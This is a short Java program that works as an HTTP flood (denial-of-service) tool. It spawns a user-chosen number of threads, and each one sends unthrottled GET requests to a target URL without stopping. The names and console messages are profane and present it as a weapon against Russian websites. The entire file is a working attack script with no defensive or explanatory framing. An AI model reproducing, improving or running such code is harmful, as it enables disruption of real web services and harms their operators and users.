import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;

import static java.util.Objects.nonNull;

public class HeyBabe implements Runnable {

    public static Integer dicksToFuckWith;
    public static String russiaPomoikaUrl;

    public static void main(String[] args) {
        System.setProperty("https.protocols", "TLSv1.1");

        dicksToFuckWith = Integer.parseInt(args[0]);
        russiaPomoikaUrl = args[1];

        System.out.println("Stating to fuck " + russiaPomoikaUrl + " with " + dicksToFuckWith + " huiv");

        gloryToUkraine();
    }

    private static void gloryToUkraine() {
        for (int i = 0; i < dicksToFuckWith; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void sayPalianyzia() {
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = null;
        try {
            response = Unirest.get(russiaPomoikaUrl)
                    .asString();
            if (nonNull(response) && response.getStatus() == 200) {
                System.out.println("Status code " + response.getStatus());
            } else {
                if (nonNull(response)) {
                    System.err.println("Status code --------> " + response.getStatus());
                } else {
                    System.err.println("--------> Status code is undefined");
                }
            }
        } catch (Exception e) {
            System.err.println("ruskiy karabel, pishow nahui!");
            System.err.println(e.getMessage());
        }
    }

    public static void fuckrussia() {
        boolean russiaIdeNahui = true;

        while (russiaIdeNahui) {
            try {
                sayPalianyzia();
                System.gc();
            } catch (OutOfMemoryError e) {
                russiaIdeNahui = false;
            }
        }
    }

    @Override
    public void run() {
        fuckrussia();
    }
}